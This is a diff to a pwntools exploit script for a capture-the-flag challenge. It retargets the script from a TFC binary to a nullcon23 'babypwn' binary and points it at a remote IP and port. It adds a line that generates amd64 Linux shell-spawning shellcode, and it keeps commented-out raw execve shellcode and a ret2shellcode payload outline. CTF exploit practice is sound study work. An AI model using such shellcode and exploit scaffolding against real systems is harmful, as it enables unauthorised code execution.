@@ -5,11 +5,11 @@
 from pwn import *
 
 # Set up pwntools for the correct architecture
-elf = context.binary = ELF('./TFC/notes', checksec=True)
+elf = context.binary = ELF('../nullcon23/babypwn', checksec=False)
 
 # Enable verbose logging so we can see exactly what is being sent (info/debug)
-# context.log_level = 'debug'
-
+context.log_level = 'debug'
+context.arch = "amd64"
 context.terminal = ['tmux', 'splitw', '-h']
 
 # Many built-in settings can be controlled on the command-line and show up
@@ -17,8 +17,8 @@ context.terminal = ['tmux', 'splitw', '-h']
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141
-host = args.HOST or 'challs.tfcctf.com'
-port = int(args.PORT or 30682)
+host = args.HOST or '52.59.124.14'
+port = int(args.PORT or 10100)
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -75,6 +75,7 @@ continue
 # io.sendline(payload)
 
 #ret2shellcode
+shellcode = asm(shellcraft.amd64.linux.sh())
 # shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
 # payload = shellcode + cyclic(16) + pack(shellcodevar_address)
 
